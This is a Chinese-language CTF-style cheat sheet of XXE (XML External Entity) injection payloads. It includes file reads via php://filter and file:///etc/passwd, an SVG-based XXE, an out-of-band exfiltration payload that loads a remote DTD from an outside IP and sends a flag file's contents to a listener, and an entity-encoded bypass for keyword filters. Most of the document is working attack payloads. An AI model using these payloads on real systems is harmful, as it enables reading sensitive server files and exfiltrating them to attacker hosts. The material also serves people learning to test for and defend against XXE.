---
title: 【WEB】XXE
---
# XXE

XXE （ PHP 5.45之后不解析实体 ）

```
<!DOCTYPE 根标签名 SYSTEM "文件名">
```

DTD实体是用于定义引用文本或字符的快捷方式的变量，可内部声明或外部引用。

约束通过类别关键词 ANY 声明的元素，可包含任何可解析数据的组合：

```
<!ELEMENT 标签名 ANY>
```

同时xxe可进行内网探测读取 /etc/hosts



## Payload

PHP文件读取

```
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE xxe [
<!ELEMENT name ANY>
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=flag.php">]>
<creds>
<user>&xxe;</user>
</creds>
```

file协议读取文件

```
<?xml version="1.0"?>
<!DOCTYPE GVI [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<catalog>
    	<core id="test101">
     		<description>&xxe;</description>
  		</core>
</catalog>
```

SVG格式

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [
<!ENTITY file SYSTEM "要读取的文件路径" >
]>
<svg height="100" width="1000">
  		<text x="10" y="20">&file;</text>
</svg>
```

数据外带

```
<!DOCTYPE root [ 
<!ENTITY % remote SYSTEM "http://174.1.66.167/shell.dtd">
%remote;
]>

shell.dtd
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://127.0.0.1:5555/?flag=%file;'>">
%int;
%send;
```

xxe绕过的payload

当只过滤了SYSTEM，PUBLIC等关键字时，可用双重实体编码绕过

```
<?xml version="1.0"?>

<!DOCTYPE GVI [

    <!ENTITY % xml "&#60;&#33;&#69;&#78;&#84;&#73;&#84;&#89;&#32;&#120;&#120;&#101;&#32;&#83;&#89;&#83;&#84;&#69;&#77;&#32;&#34;&#102;&#105;&#108;&#101;&#58;&#47;&#47;&#47;&#102;&#108;&#97;&#103;&#46;&#116;&#120;&#116;&#34;&#32;&#62;&#93;&#62;&#10;&#60;&#99;&#111;&#114;&#101;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#109;&#101;&#115;&#115;&#97;&#103;&#101;&#62;&#38;&#120;&#120;&#101;&#59;&#60;&#47;&#109;&#101;&#115;&#115;&#97;&#103;&#101;&#62;&#10;&#60;&#47;&#99;&#111;&#114;&#101;&#62;">

    %xml;
```

即为在xml实体中再定义一次xml，可成功被解析，支持dtd数据外带

```
<!ENTITY xxe SYSTEM "file:///flag.txt" >]>
<core>
      <message>&xxe;</message>
</core>
```

以上为编码部分内容

